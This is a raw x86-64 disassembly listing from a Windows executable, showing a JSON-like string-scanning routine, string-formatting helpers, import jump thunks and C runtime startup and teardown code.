   140004bf9:	84 c0                	test   %al,%al
   140004bfb:	74 20                	je     0x140004c1d
   140004bfd:	3c 5b                	cmp    $0x5b,%al
   140004bff:	0f 8f e9 00 00 00    	jg     0x140004cee
   140004c05:	3c 1f                	cmp    $0x1f,%al
   140004c07:	7f df                	jg     0x140004be8
   140004c09:	3c 0a                	cmp    $0xa,%al
   140004c0b:	7f 23                	jg     0x140004c30
   140004c0d:	3c 08                	cmp    $0x8,%al
   140004c0f:	7e 2b                	jle    0x140004c3c
   140004c11:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   140004c15:	48 83 c2 01          	add    $0x1,%rdx
   140004c19:	84 c0                	test   %al,%al
   140004c1b:	75 e0                	jne    0x140004bfd
   140004c1d:	31 c0                	xor    %eax,%eax
   140004c1f:	48 83 c4 20          	add    $0x20,%rsp
   140004c23:	5b                   	pop    %rbx
   140004c24:	5e                   	pop    %rsi
   140004c25:	5f                   	pop    %rdi
   140004c26:	c3                   	ret
   140004c27:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140004c2e:	00 00 
   140004c30:	3c 0d                	cmp    $0xd,%al
   140004c32:	74 bd                	je     0x140004bf1
   140004c34:	0f 1f 40 00          	nopl   0x0(%rax)
   140004c38:	3c 22                	cmp    $0x22,%al
   140004c3a:	74 74                	je     0x140004cb0
   140004c3c:	0f b6 02             	movzbl (%rdx),%eax
   140004c3f:	84 c0                	test   %al,%al
   140004c41:	41 0f 95 c1          	setne  %r9b
   140004c45:	3c 2c                	cmp    $0x2c,%al
   140004c47:	0f 95 c1             	setne  %cl
   140004c4a:	41 84 c9             	test   %cl,%r9b
   140004c4d:	0f 84 8d 00 00 00    	je     0x140004ce0
   140004c53:	3c 5d                	cmp    $0x5d,%al
   140004c55:	48 89 d3             	mov    %rdx,%rbx
   140004c58:	75 0a                	jne    0x140004c64
   140004c5a:	e9 81 00 00 00       	jmp    0x140004ce0
   140004c5f:	90                   	nop
   140004c60:	3c 5d                	cmp    $0x5d,%al
   140004c62:	74 18                	je     0x140004c7c
   140004c64:	0f b6 43 01          	movzbl 0x1(%rbx),%eax
   140004c68:	48 83 c3 01          	add    $0x1,%rbx
   140004c6c:	84 c0                	test   %al,%al
   140004c6e:	41 0f 95 c1          	setne  %r9b
   140004c72:	3c 2c                	cmp    $0x2c,%al
   140004c74:	0f 95 c1             	setne  %cl
   140004c77:	41 84 c9             	test   %cl,%r9b
   140004c7a:	75 e4                	jne    0x140004c60
   140004c7c:	89 d8                	mov    %ebx,%eax
   140004c7e:	29 d0                	sub    %edx,%eax
   140004c80:	41 8d 48 ff          	lea    -0x1(%r8),%ecx
   140004c84:	41 39 c0             	cmp    %eax,%r8d
   140004c87:	0f 4e c1             	cmovle %ecx,%eax
   140004c8a:	48 63 f8             	movslq %eax,%rdi
   140004c8d:	49 89 f8             	mov    %rdi,%r8
   140004c90:	4c 89 d1             	mov    %r10,%rcx
   140004c93:	e8 80 db 00 00       	call   0x140012818
   140004c98:	c6 04 38 00          	movb   $0x0,(%rax,%rdi,1)
   140004c9c:	b8 01 00 00 00       	mov    $0x1,%eax
   140004ca1:	48 89 1e             	mov    %rbx,(%rsi)
   140004ca4:	48 83 c4 20          	add    $0x20,%rsp
   140004ca8:	5b                   	pop    %rbx
   140004ca9:	5e                   	pop    %rsi
   140004caa:	5f                   	pop    %rdi
   140004cab:	c3                   	ret
   140004cac:	0f 1f 40 00          	nopl   0x0(%rax)
   140004cb0:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   140004cb4:	48 8d 5a 01          	lea    0x1(%rdx),%rbx
   140004cb8:	84 c0                	test   %al,%al
   140004cba:	75 10                	jne    0x140004ccc
   140004cbc:	eb 29                	jmp    0x140004ce7
   140004cbe:	66 90                	xchg   %ax,%ax
   140004cc0:	0f b6 43 01          	movzbl 0x1(%rbx),%eax
   140004cc4:	48 83 c3 01          	add    $0x1,%rbx
   140004cc8:	84 c0                	test   %al,%al
   140004cca:	74 b0                	je     0x140004c7c
   140004ccc:	3c 22                	cmp    $0x22,%al
   140004cce:	75 f0                	jne    0x140004cc0
   140004cd0:	80 7b ff 5c          	cmpb   $0x5c,-0x1(%rbx)
   140004cd4:	74 ea                	je     0x140004cc0
   140004cd6:	48 83 c3 01          	add    $0x1,%rbx
   140004cda:	89 d8                	mov    %ebx,%eax
   140004cdc:	29 d0                	sub    %edx,%eax
   140004cde:	eb a0                	jmp    0x140004c80
   140004ce0:	48 89 d3             	mov    %rdx,%rbx
   140004ce3:	31 c0                	xor    %eax,%eax
   140004ce5:	eb 99                	jmp    0x140004c80
   140004ce7:	b8 01 00 00 00       	mov    $0x1,%eax
   140004cec:	eb 92                	jmp    0x140004c80
   140004cee:	3c 5d                	cmp    $0x5d,%al
   140004cf0:	0f 84 27 ff ff ff    	je     0x140004c1d
   140004cf6:	3c 7b                	cmp    $0x7b,%al
   140004cf8:	0f 85 3e ff ff ff    	jne    0x140004c3c
   140004cfe:	0f b6 0a             	movzbl (%rdx),%ecx
   140004d01:	48 89 d3             	mov    %rdx,%rbx
   140004d04:	84 c9                	test   %cl,%cl
   140004d06:	0f 84 9d 00 00 00    	je     0x140004da9
   140004d0c:	45 31 c9             	xor    %r9d,%r9d
   140004d0f:	eb 24                	jmp    0x140004d35
   140004d11:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004d18:	48 8d 43 01          	lea    0x1(%rbx),%rax
   140004d1c:	80 f9 7d             	cmp    $0x7d,%cl
   140004d1f:	74 37                	je     0x140004d58
   140004d21:	80 f9 22             	cmp    $0x22,%cl
   140004d24:	74 5a                	je     0x140004d80
   140004d26:	48 89 d8             	mov    %rbx,%rax
   140004d29:	0f b6 48 01          	movzbl 0x1(%rax),%ecx
   140004d2d:	48 8d 58 01          	lea    0x1(%rax),%rbx
   140004d31:	84 c9                	test   %cl,%cl
   140004d33:	74 18                	je     0x140004d4d
   140004d35:	80 f9 7b             	cmp    $0x7b,%cl
   140004d38:	75 de                	jne    0x140004d18
   140004d3a:	48 89 d8             	mov    %rbx,%rax
   140004d3d:	41 83 c1 01          	add    $0x1,%r9d
   140004d41:	0f b6 48 01          	movzbl 0x1(%rax),%ecx
   140004d45:	48 8d 58 01          	lea    0x1(%rax),%rbx
   140004d49:	84 c9                	test   %cl,%cl
   140004d4b:	75 e8                	jne    0x140004d35
   140004d4d:	89 d9                	mov    %ebx,%ecx
   140004d4f:	29 d1                	sub    %edx,%ecx
   140004d51:	eb 15                	jmp    0x140004d68
   140004d53:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004d58:	41 83 e9 01          	sub    $0x1,%r9d
   140004d5c:	75 c8                	jne    0x140004d26
   140004d5e:	89 c1                	mov    %eax,%ecx
   140004d60:	48 89 c3             	mov    %rax,%rbx
   140004d63:	29 d1                	sub    %edx,%ecx
   140004d65:	0f 1f 00             	nopl   (%rax)
   140004d68:	41 8d 40 ff          	lea    -0x1(%r8),%eax
   140004d6c:	41 39 c8             	cmp    %ecx,%r8d
   140004d6f:	0f 4e c8             	cmovle %eax,%ecx
   140004d72:	48 63 f9             	movslq %ecx,%rdi
   140004d75:	e9 13 ff ff ff       	jmp    0x140004c8d
   140004d7a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004d80:	0f b6 4b 01          	movzbl 0x1(%rbx),%ecx
   140004d84:	84 c9                	test   %cl,%cl
   140004d86:	75 14                	jne    0x140004d9c
   140004d88:	eb 9f                	jmp    0x140004d29
   140004d8a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004d90:	0f b6 48 01          	movzbl 0x1(%rax),%ecx
   140004d94:	48 83 c0 01          	add    $0x1,%rax
   140004d98:	84 c9                	test   %cl,%cl
   140004d9a:	74 8d                	je     0x140004d29
   140004d9c:	80 f9 22             	cmp    $0x22,%cl
   140004d9f:	75 ef                	jne    0x140004d90
   140004da1:	80 78 ff 5c          	cmpb   $0x5c,-0x1(%rax)
   140004da5:	74 e9                	je     0x140004d90
   140004da7:	eb 80                	jmp    0x140004d29
   140004da9:	31 c9                	xor    %ecx,%ecx
   140004dab:	eb bb                	jmp    0x140004d68
   140004dad:	0f 1f 00             	nopl   (%rax)
   140004db0:	41 56                	push   %r14
   140004db2:	41 55                	push   %r13
   140004db4:	41 54                	push   %r12
   140004db6:	55                   	push   %rbp
   140004db7:	57                   	push   %rdi
   140004db8:	56                   	push   %rsi
   140004db9:	53                   	push   %rbx
   140004dba:	48 81 ec 90 03 00 00 	sub    $0x390,%rsp
   140004dc1:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   140004dc7:	48 8d ac 24 90 00 00 	lea    0x90(%rsp),%rbp
   140004dce:	00 
   140004dcf:	48 89 d3             	mov    %rdx,%rbx
   140004dd2:	48 89 cf             	mov    %rcx,%rdi
   140004dd5:	4c 8d a4 24 90 01 00 	lea    0x190(%rsp),%r12
   140004ddc:	00 
   140004ddd:	48 89 ea             	mov    %rbp,%rdx
   140004de0:	48 89 d9             	mov    %rbx,%rcx
   140004de3:	e8 58 f8 ff ff       	call   0x140004640
   140004de8:	4c 8d ac 24 90 02 00 	lea    0x290(%rsp),%r13
   140004def:	00 
   140004df0:	4c 89 e2             	mov    %r12,%rdx
   140004df3:	48 8d 8b 00 01 00 00 	lea    0x100(%rbx),%rcx
   140004dfa:	e8 41 f8 ff ff       	call   0x140004640
   140004dff:	4c 8d 74 24 50       	lea    0x50(%rsp),%r14
   140004e04:	4c 89 ea             	mov    %r13,%rdx
   140004e07:	48 8d 8b 00 02 00 00 	lea    0x200(%rbx),%rcx
   140004e0e:	e8 2d f8 ff ff       	call   0x140004640
   140004e13:	4c 89 f2             	mov    %r14,%rdx
   140004e16:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140004e1c:	48 8d 8b 00 03 00 00 	lea    0x300(%rbx),%rcx
   140004e23:	e8 18 f8 ff ff       	call   0x140004640
   140004e28:	b9 00 04 00 00       	mov    $0x400,%ecx
   140004e2d:	e8 de d9 00 00       	call   0x140012810
   140004e32:	48 8d 15 2c 2a 01 00 	lea    0x12a2c(%rip),%rdx        # 0x140017865
   140004e39:	49 89 f9             	mov    %rdi,%r9
   140004e3c:	4c 8d 05 2d 2a 01 00 	lea    0x12a2d(%rip),%r8        # 0x140017870
   140004e43:	48 89 c6             	mov    %rax,%rsi
   140004e46:	8b 83 20 03 00 00    	mov    0x320(%rbx),%eax
   140004e4c:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   140004e51:	48 8d 1d 7f 2a 01 00 	lea    0x12a7f(%rip),%rbx        # 0x1400178d7
   140004e58:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   140004e5d:	48 89 f1             	mov    %rsi,%rcx
   140004e60:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   140004e65:	4c 89 64 24 28       	mov    %r12,0x28(%rsp)
   140004e6a:	85 c0                	test   %eax,%eax
   140004e6c:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140004e71:	48 8d 05 f2 29 01 00 	lea    0x129f2(%rip),%rax        # 0x14001786a
   140004e78:	48 0f 45 c2          	cmovne %rdx,%rax
   140004e7c:	ba 00 04 00 00       	mov    $0x400,%edx
   140004e81:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140004e86:	ff 15 74 79 01 00    	call   *0x17974(%rip)        # 0x14001c800
   140004e8c:	48 89 f0             	mov    %rsi,%rax
   140004e8f:	48 81 c4 90 03 00 00 	add    $0x390,%rsp
   140004e96:	5b                   	pop    %rbx
   140004e97:	5e                   	pop    %rsi
   140004e98:	5f                   	pop    %rdi
   140004e99:	5d                   	pop    %rbp
   140004e9a:	41 5c                	pop    %r12
   140004e9c:	41 5d                	pop    %r13
   140004e9e:	41 5e                	pop    %r14
   140004ea0:	c3                   	ret
   140004ea1:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140004ea8:	00 00 00 00 
   140004eac:	0f 1f 40 00          	nopl   0x0(%rax)
   140004eb0:	41 55                	push   %r13
   140004eb2:	41 54                	push   %r12
   140004eb4:	55                   	push   %rbp
   140004eb5:	57                   	push   %rdi
   140004eb6:	56                   	push   %rsi
   140004eb7:	53                   	push   %rbx
   140004eb8:	48 81 ec 88 03 00 00 	sub    $0x388,%rsp
   140004ebf:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   140004ec5:	48 8d bc 24 80 00 00 	lea    0x80(%rsp),%rdi
   140004ecc:	00 
   140004ecd:	48 89 cb             	mov    %rcx,%rbx
   140004ed0:	48 8d ac 24 80 01 00 	lea    0x180(%rsp),%rbp
   140004ed7:	00 
   140004ed8:	48 89 fa             	mov    %rdi,%rdx
   140004edb:	e8 60 f7 ff ff       	call   0x140004640
   140004ee0:	4c 8d a4 24 80 02 00 	lea    0x280(%rsp),%r12
   140004ee7:	00 
   140004ee8:	48 89 ea             	mov    %rbp,%rdx
   140004eeb:	48 8d 8b 00 01 00 00 	lea    0x100(%rbx),%rcx
   140004ef2:	e8 49 f7 ff ff       	call   0x140004640
   140004ef7:	4c 8d 6c 24 40       	lea    0x40(%rsp),%r13
   140004efc:	4c 89 e2             	mov    %r12,%rdx
   140004eff:	48 8d 8b 00 02 00 00 	lea    0x200(%rbx),%rcx
   140004f06:	e8 35 f7 ff ff       	call   0x140004640
   140004f0b:	4c 89 ea             	mov    %r13,%rdx
   140004f0e:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140004f14:	48 8d 8b 00 03 00 00 	lea    0x300(%rbx),%rcx
   140004f1b:	e8 20 f7 ff ff       	call   0x140004640
   140004f20:	b9 00 04 00 00       	mov    $0x400,%ecx
   140004f25:	e8 e6 d8 00 00       	call   0x140012810
   140004f2a:	48 8d 15 34 29 01 00 	lea    0x12934(%rip),%rdx        # 0x140017865
   140004f31:	49 89 f9             	mov    %rdi,%r9
   140004f34:	4c 8d 05 a5 29 01 00 	lea    0x129a5(%rip),%r8        # 0x1400178e0
   140004f3b:	48 89 c6             	mov    %rax,%rsi
   140004f3e:	8b 83 20 03 00 00    	mov    0x320(%rbx),%eax
   140004f44:	4c 89 6c 24 30       	mov    %r13,0x30(%rsp)
   140004f49:	4c 89 64 24 28       	mov    %r12,0x28(%rsp)
   140004f4e:	48 89 f1             	mov    %rsi,%rcx
   140004f51:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140004f56:	85 c0                	test   %eax,%eax
   140004f58:	48 8d 05 0b 29 01 00 	lea    0x1290b(%rip),%rax        # 0x14001786a
   140004f5f:	48 0f 45 c2          	cmovne %rdx,%rax
   140004f63:	ba 00 04 00 00       	mov    $0x400,%edx
   140004f68:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140004f6d:	ff 15 8d 78 01 00    	call   *0x1788d(%rip)        # 0x14001c800
   140004f73:	48 89 f0             	mov    %rsi,%rax
   140004f76:	48 81 c4 88 03 00 00 	add    $0x388,%rsp
   140004f7d:	5b                   	pop    %rbx
   140004f7e:	5e                   	pop    %rsi
   140004f7f:	5f                   	pop    %rdi
   140004f80:	5d                   	pop    %rbp
   140004f81:	41 5c                	pop    %r12
   140004f83:	41 5d                	pop    %r13
   140004f85:	c3                   	ret
   140004f86:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140004f8d:	00 00 00 
   140004f90:	55                   	push   %rbp
   140004f91:	57                   	push   %rdi
   140004f92:	56                   	push   %rsi
   140004f93:	53                   	push   %rbx
   140004f94:	48 81 ec 78 02 00 00 	sub    $0x278,%rsp
   140004f9b:	48 8d 05 90 29 01 00 	lea    0x12990(%rip),%rax        # 0x140017932
   140004fa2:	48 85 d2             	test   %rdx,%rdx
   140004fa5:	89 ce                	mov    %ecx,%esi
   140004fa7:	48 89 d1             	mov    %rdx,%rcx
   140004faa:	48 0f 44 c8          	cmove  %rax,%rcx
   140004fae:	4c 89 c3             	mov    %r8,%rbx
   140004fb1:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140004fb7:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   140004fbc:	48 8d 6c 24 70       	lea    0x70(%rsp),%rbp
   140004fc1:	48 89 fa             	mov    %rdi,%rdx
   140004fc4:	e8 77 f6 ff ff       	call   0x140004640
   140004fc9:	48 85 db             	test   %rbx,%rbx
   140004fcc:	48 89 ea             	mov    %rbp,%rdx
   140004fcf:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   140004fd5:	48 8d 05 60 29 01 00 	lea    0x12960(%rip),%rax        # 0x14001793c
   140004fdc:	48 0f 44 d8          	cmove  %rax,%rbx
   140004fe0:	48 89 d9             	mov    %rbx,%rcx
   140004fe3:	e8 58 f6 ff ff       	call   0x140004640
   140004fe8:	b9 00 04 00 00       	mov    $0x400,%ecx
   140004fed:	e8 1e d8 00 00       	call   0x140012810
   140004ff2:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   140004ff7:	41 89 f1             	mov    %esi,%r9d
   140004ffa:	ba 00 04 00 00       	mov    $0x400,%edx
   140004fff:	48 89 c3             	mov    %rax,%rbx
   140005002:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140005007:	48 89 c1             	mov    %rax,%rcx
   14000500a:	4c 8d 05 2f 29 01 00 	lea    0x1292f(%rip),%r8        # 0x140017940
   140005011:	ff 15 e9 77 01 00    	call   *0x177e9(%rip)        # 0x14001c800
   140005017:	48 89 d8             	mov    %rbx,%rax
   14000501a:	48 81 c4 78 02 00 00 	add    $0x278,%rsp
   140005021:	5b                   	pop    %rbx
   140005022:	5e                   	pop    %rsi
   140005023:	5f                   	pop    %rdi
   140005024:	5d                   	pop    %rbp
   140005025:	c3                   	ret
   140005026:	90                   	nop
   140005027:	90                   	nop
   140005028:	90                   	nop
   140005029:	90                   	nop
   14000502a:	90                   	nop
   14000502b:	90                   	nop
   14000502c:	90                   	nop
   14000502d:	90                   	nop
   14000502e:	90                   	nop
   14000502f:	90                   	nop
   140005030:	ff 25 7a 79 01 00    	jmp    *0x1797a(%rip)        # 0x14001c9b0
   140005036:	90                   	nop
   140005037:	90                   	nop
   140005038:	ff 25 6a 79 01 00    	jmp    *0x1796a(%rip)        # 0x14001c9a8
   14000503e:	90                   	nop
   14000503f:	90                   	nop
   140005040:	ff 25 5a 79 01 00    	jmp    *0x1795a(%rip)        # 0x14001c9a0
   140005046:	90                   	nop
   140005047:	90                   	nop
   140005048:	ff 25 4a 79 01 00    	jmp    *0x1794a(%rip)        # 0x14001c998
   14000504e:	90                   	nop
   14000504f:	90                   	nop
   140005050:	ff 25 3a 79 01 00    	jmp    *0x1793a(%rip)        # 0x14001c990
   140005056:	90                   	nop
   140005057:	90                   	nop
   140005058:	ff 25 2a 79 01 00    	jmp    *0x1792a(%rip)        # 0x14001c988
   14000505e:	90                   	nop
   14000505f:	90                   	nop
   140005060:	ff 25 1a 79 01 00    	jmp    *0x1791a(%rip)        # 0x14001c980
   140005066:	90                   	nop
   140005067:	90                   	nop
   140005068:	ff 25 0a 79 01 00    	jmp    *0x1790a(%rip)        # 0x14001c978
   14000506e:	90                   	nop
   14000506f:	90                   	nop
   140005070:	ff 25 fa 78 01 00    	jmp    *0x178fa(%rip)        # 0x14001c970
   140005076:	90                   	nop
   140005077:	90                   	nop
   140005078:	ff 25 ea 78 01 00    	jmp    *0x178ea(%rip)        # 0x14001c968
   14000507e:	90                   	nop
   14000507f:	90                   	nop
   140005080:	ff 25 da 78 01 00    	jmp    *0x178da(%rip)        # 0x14001c960
   140005086:	90                   	nop
   140005087:	90                   	nop
   140005088:	ff 25 ca 78 01 00    	jmp    *0x178ca(%rip)        # 0x14001c958
   14000508e:	90                   	nop
   14000508f:	90                   	nop
   140005090:	ff 25 ba 78 01 00    	jmp    *0x178ba(%rip)        # 0x14001c950
   140005096:	90                   	nop
   140005097:	90                   	nop
   140005098:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000509f:	00 
   1400050a0:	ff 25 2a 75 01 00    	jmp    *0x1752a(%rip)        # 0x14001c5d0
   1400050a6:	90                   	nop
   1400050a7:	90                   	nop
   1400050a8:	ff 25 1a 75 01 00    	jmp    *0x1751a(%rip)        # 0x14001c5c8
   1400050ae:	90                   	nop
   1400050af:	90                   	nop
   1400050b0:	ff 25 0a 75 01 00    	jmp    *0x1750a(%rip)        # 0x14001c5c0
   1400050b6:	90                   	nop
   1400050b7:	90                   	nop
   1400050b8:	ff 25 fa 74 01 00    	jmp    *0x174fa(%rip)        # 0x14001c5b8
   1400050be:	90                   	nop
   1400050bf:	90                   	nop
   1400050c0:	ff 25 ea 74 01 00    	jmp    *0x174ea(%rip)        # 0x14001c5b0
   1400050c6:	90                   	nop
   1400050c7:	90                   	nop
   1400050c8:	ff 25 da 74 01 00    	jmp    *0x174da(%rip)        # 0x14001c5a8
   1400050ce:	90                   	nop
   1400050cf:	90                   	nop
   1400050d0:	ff 25 ca 74 01 00    	jmp    *0x174ca(%rip)        # 0x14001c5a0
   1400050d6:	90                   	nop
   1400050d7:	90                   	nop
   1400050d8:	ff 25 ba 74 01 00    	jmp    *0x174ba(%rip)        # 0x14001c598
   1400050de:	90                   	nop
   1400050df:	90                   	nop
   1400050e0:	ff 25 aa 74 01 00    	jmp    *0x174aa(%rip)        # 0x14001c590
   1400050e6:	90                   	nop
   1400050e7:	90                   	nop
   1400050e8:	ff 25 9a 74 01 00    	jmp    *0x1749a(%rip)        # 0x14001c588
   1400050ee:	90                   	nop
   1400050ef:	90                   	nop
   1400050f0:	ff 25 8a 74 01 00    	jmp    *0x1748a(%rip)        # 0x14001c580
   1400050f6:	90                   	nop
   1400050f7:	90                   	nop
   1400050f8:	ff 25 7a 74 01 00    	jmp    *0x1747a(%rip)        # 0x14001c578
   1400050fe:	90                   	nop
   1400050ff:	90                   	nop
   140005100:	ff 25 6a 74 01 00    	jmp    *0x1746a(%rip)        # 0x14001c570
   140005106:	90                   	nop
   140005107:	90                   	nop
   140005108:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000510f:	00 
   140005110:	ff 25 4a 74 01 00    	jmp    *0x1744a(%rip)        # 0x14001c560
   140005116:	90                   	nop
   140005117:	90                   	nop
   140005118:	ff 25 3a 74 01 00    	jmp    *0x1743a(%rip)        # 0x14001c558
   14000511e:	90                   	nop
   14000511f:	90                   	nop
   140005120:	ff 25 2a 74 01 00    	jmp    *0x1742a(%rip)        # 0x14001c550
   140005126:	90                   	nop
   140005127:	90                   	nop
   140005128:	ff 25 1a 74 01 00    	jmp    *0x1741a(%rip)        # 0x14001c548
   14000512e:	90                   	nop
   14000512f:	90                   	nop
   140005130:	ff 25 0a 74 01 00    	jmp    *0x1740a(%rip)        # 0x14001c540
   140005136:	90                   	nop
   140005137:	90                   	nop
   140005138:	ff 25 fa 73 01 00    	jmp    *0x173fa(%rip)        # 0x14001c538
   14000513e:	90                   	nop
   14000513f:	90                   	nop
   140005140:	ff 25 ea 73 01 00    	jmp    *0x173ea(%rip)        # 0x14001c530
   140005146:	90                   	nop
   140005147:	90                   	nop
   140005148:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000514f:	00 
   140005150:	ff 25 da 77 01 00    	jmp    *0x177da(%rip)        # 0x14001c930
   140005156:	90                   	nop
   140005157:	90                   	nop
   140005158:	ff 25 ca 77 01 00    	jmp    *0x177ca(%rip)        # 0x14001c928
   14000515e:	90                   	nop
   14000515f:	90                   	nop
   140005160:	48 83 ec 28          	sub    $0x28,%rsp
   140005164:	48 8b 05 95 de 00 00 	mov    0xde95(%rip),%rax        # 0x140013000
   14000516b:	48 8b 00             	mov    (%rax),%rax
   14000516e:	48 85 c0             	test   %rax,%rax
   140005171:	74 22                	je     0x140005195
   140005173:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005178:	ff d0                	call   *%rax
   14000517a:	48 8b 05 7f de 00 00 	mov    0xde7f(%rip),%rax        # 0x140013000
   140005181:	48 8d 50 08          	lea    0x8(%rax),%rdx
   140005185:	48 8b 40 08          	mov    0x8(%rax),%rax
   140005189:	48 89 15 70 de 00 00 	mov    %rdx,0xde70(%rip)        # 0x140013000
   140005190:	48 85 c0             	test   %rax,%rax
   140005193:	75 e3                	jne    0x140005178
   140005195:	48 83 c4 28          	add    $0x28,%rsp
   140005199:	c3                   	ret
   14000519a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400051a0:	56                   	push   %rsi
   1400051a1:	53                   	push   %rbx
   1400051a2:	48 83 ec 28          	sub    $0x28,%rsp
   1400051a6:	48 8b 15 33 33 01 00 	mov    0x13333(%rip),%rdx        # 0x1400184e0
   1400051ad:	48 8b 02             	mov    (%rdx),%rax
   1400051b0:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400051b3:	89 c1                	mov    %eax,%ecx
   1400051b5:	74 39                	je     0x1400051f0
   1400051b7:	85 c9                	test   %ecx,%ecx
   1400051b9:	74 20                	je     0x1400051db
   1400051bb:	89 c8                	mov    %ecx,%eax
   1400051bd:	83 e9 01             	sub    $0x1,%ecx
   1400051c0:	48 8d 1c c2          	lea    (%rdx,%rax,8),%rbx
   1400051c4:	48 29 c8             	sub    %rcx,%rax
   1400051c7:	48 8d 74 c2 f8       	lea    -0x8(%rdx,%rax,8),%rsi
   1400051cc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400051d0:	ff 13                	call   *(%rbx)
   1400051d2:	48 83 eb 08          	sub    $0x8,%rbx
   1400051d6:	48 39 f3             	cmp    %rsi,%rbx
   1400051d9:	75 f5                	jne    0x1400051d0
   1400051db:	48 8d 0d 7e ff ff ff 	lea    -0x82(%rip),%rcx        # 0x140005160
   1400051e2:	48 83 c4 28          	add    $0x28,%rsp
   1400051e6:	5b                   	pop    %rbx
   1400051e7:	5e                   	pop    %rsi
   1400051e8:	e9 23 c2 ff ff       	jmp    0x140001410
   1400051ed:	0f 1f 00             	nopl   (%rax)
   1400051f0:	31 c0                	xor    %eax,%eax
   1400051f2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400051f8:	44 8d 40 01          	lea    0x1(%rax),%r8d
   1400051fc:	89 c1                	mov    %eax,%ecx
   1400051fe:	4a 83 3c c2 00       	cmpq   $0x0,(%rdx,%r8,8)
   140005203:	4c 89 c0             	mov    %r8,%rax
   140005206:	75 f0                	jne    0x1400051f8
   140005208:	eb ad                	jmp    0x1400051b7
   14000520a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140005210:	8b 05 2a 5e 01 00    	mov    0x15e2a(%rip),%eax        # 0x14001b040
   140005216:	85 c0                	test   %eax,%eax
   140005218:	74 06                	je     0x140005220
   14000521a:	c3                   	ret
   14000521b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005220:	c7 05 16 5e 01 00 01 	movl   $0x1,0x15e16(%rip)        # 0x14001b040
   140005227:	00 00 00 
   14000522a:	e9 71 ff ff ff       	jmp    0x1400051a0
   14000522f:	90                   	nop
   140005230:	31 c0                	xor    %eax,%eax
   140005232:	c3                   	ret
   140005233:	90                   	nop
   140005234:	90                   	nop
   140005235:	90                   	nop
   140005236:	90                   	nop
   140005237:	90                   	nop
   140005238:	90                   	nop
   140005239:	90                   	nop
   14000523a:	90                   	nop
   14000523b:	90                   	nop
   14000523c:	90                   	nop
   14000523d:	90                   	nop
   14000523e:	90                   	nop
   14000523f:	90                   	nop
   140005240:	48 83 ec 28          	sub    $0x28,%rsp
   140005244:	83 fa 03             	cmp    $0x3,%edx
   140005247:	74 17                	je     0x140005260
   140005249:	85 d2                	test   %edx,%edx
   14000524b:	74 13                	je     0x140005260
   14000524d:	b8 01 00 00 00       	mov    $0x1,%eax
   140005252:	48 83 c4 28          	add    $0x28,%rsp
   140005256:	c3                   	ret
   140005257:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000525e:	00 00 
   140005260:	e8 5b 0a 00 00       	call   0x140005cc0
   140005265:	b8 01 00 00 00       	mov    $0x1,%eax
   14000526a:	48 83 c4 28          	add    $0x28,%rsp
   14000526e:	c3                   	ret
   14000526f:	90                   	nop
   140005270:	56                   	push   %rsi
   140005271:	53                   	push   %rbx
   140005272:	48 83 ec 28          	sub    $0x28,%rsp
   140005276:	48 8b 05 43 32 01 00 	mov    0x13243(%rip),%rax        # 0x1400184c0
   14000527d:	83 38 02             	cmpl   $0x2,(%rax)
   140005280:	74 06                	je     0x140005288
   140005282:	c7 00 02 00 00 00    	movl   $0x2,(%rax)
   140005288:	83 fa 02             	cmp    $0x2,%edx
   14000528b:	74 13                	je     0x1400052a0
   14000528d:	83 fa 01             	cmp    $0x1,%edx
   140005290:	74 4e                	je     0x1400052e0
   140005292:	b8 01 00 00 00       	mov    $0x1,%eax
   140005297:	48 83 c4 28          	add    $0x28,%rsp
   14000529b:	5b                   	pop    %rbx
   14000529c:	5e                   	pop    %rsi
   14000529d:	c3                   	ret
   14000529e:	66 90                	xchg   %ax,%ax
   1400052a0:	48 8d 1d b1 8d 01 00 	lea    0x18db1(%rip),%rbx        # 0x14001e058
   1400052a7:	48 8d 35 aa 8d 01 00 	lea    0x18daa(%rip),%rsi        # 0x14001e058
   1400052ae:	48 39 de             	cmp    %rbx,%rsi
   1400052b1:	74 df                	je     0x140005292
   1400052b3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400052b8:	48 8b 03             	mov    (%rbx),%rax
   1400052bb:	48 85 c0             	test   %rax,%rax
